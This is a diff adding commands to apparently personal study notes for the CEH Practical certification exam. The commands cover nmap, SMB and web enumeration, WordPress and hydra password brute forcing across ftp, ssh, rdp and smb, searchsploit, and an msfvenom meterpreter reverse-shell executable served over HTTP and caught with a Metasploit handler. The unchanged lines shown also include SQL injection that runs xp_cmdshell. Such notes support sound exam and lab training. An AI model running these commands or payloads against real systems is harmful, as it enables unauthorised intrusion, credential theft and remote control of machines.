@@ -1,5 +1,13 @@
 CEH Practical Notes
+
+1) Nmap
+nmap -sn 170.16.0.1/24 -oN nmap.txt
+nmap -O 170.16.0.1/24 -oN namp-OS.txt
+namp -sC -sV -sS 170.16.0.20 -oN namp-all.txt
+
+
 Module 02: Enumeration 
+netdiscover -i eth0 
 ping www.moviescope.com –f –l 1500 -> Frame size
 tracert www.moviescope.com -> Determining hop count
 
@@ -63,12 +71,28 @@ enum4linux -u martin -p apple -U 10.10.10.12 -> Users Enumeration
 enum4linux -u martin -p apple -o 10.10.10.12 -> OS Enumeration
 enum4linux -u martin -p apple -P 10.10.10.12 -> Password Policy Information
 enum4linux -u martin -p apple -G 10.10.10.12 -> Groups Information
+enum4linux -U IP [user enum]
+enum4linux -S IP [shares enum]
+enum4linux -M IP [machines enum]
+enum4linux -a IP [All option]
 
 enum4linux -u martin -p apple -S 10.10.10.12 -> Share Policy Information (SMB Shares Enumeration
 
+smbclient
+smbclient -L //IP/ - List shares
+smbclient -L //IP/ -U ''username%password"
+smbclient //IP/sharepath [connect to share path]
+
+
+# gobuster/dirb/uniscan
+gobuster -e -u http://10.10.10.10 -w wordlsit.txt
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-*.txt -x jpg,png,php,aspx,css,html
+dirb http://10.10.10.10 wordlist.txt
+
+
 Active Directory LDAP Enumeration : ADExplorer
 Module 05 : Vulnerability Analysis 
-nikto -h  http://www.goodshopping.com/ -Tuning 1 
+nikto -h  http://www.goodshopping.com/ -Tuning 1  (optional: -Tuning 1)
 
 Nessus runs on https://localhost:8834/
 Username: admin 
@@ -108,6 +132,13 @@ Ophcrack.exe -> load -> PWDUMP File
 
 Tables -> Vista free -> select the table directory -> crack
 
+# vuln VNC session
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=your_ip LPORT=4444 -o Rev_shell.exe
+python3 -m http.server 8888
+msf > use multi/handler
+msf > set payload windows/meterpreter/reverse_tcp
+meterpreter > sysinfo && run vnc
+
 Module 08: Sniffing
 http.request.method == “POST” -> Wireshark filter for filtering HTTP POST request 
 Capture traffic from remote interface via wireshark
@@ -124,6 +155,9 @@ Module 14: Hacking Web Applications
 Wordpress
 
 wpscan --url http://10.10.10.12:8080 --enumerate u
+wpscan --url  http://10.10.10.12:8080 --password passw.txt --usernames user.txt
+wpscan -u james -P /password.txt — url http://172.16.0.27:8080/CEH/
+wpscan --api-token <API Token from Step#26> --url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate vp and press Enter
 
 WP password bruteforce
 msfconsole
@@ -165,3 +199,26 @@ blah';create database mydatabase;
 Execute cmd from login
 
 blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
+
+Some of the service brute force with hydra:
+
+    hydra -l root -P passwords.txt [-t 32] <IP> ftp
+    hydra -L usernames.txt -P pass.txt <IP> mysql
+    hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
+    hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
+    hydra -P common-snmp-community-strings.txt target.com snmp
+    hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
+    hydra -l root -P passwords.txt <IP> ssh
+
+Searchsploit useful commands:
+
+    searchsploit “Linux Kernel”
+    searchsploit -m 7618 — Paste the exploit in the current directory
+    searchsploit -p 7618[.c] — Show complete path
+    searchsploit — nmap file.xml — Search vulns inside a Nmap XML result
+
+cewl example.com -m 5 -w words.txt
+# where cewl is the tool, 
+# example.com is the site, 
+# -m is to specify the minimum length of the word, 
+# -w is to specify the output file
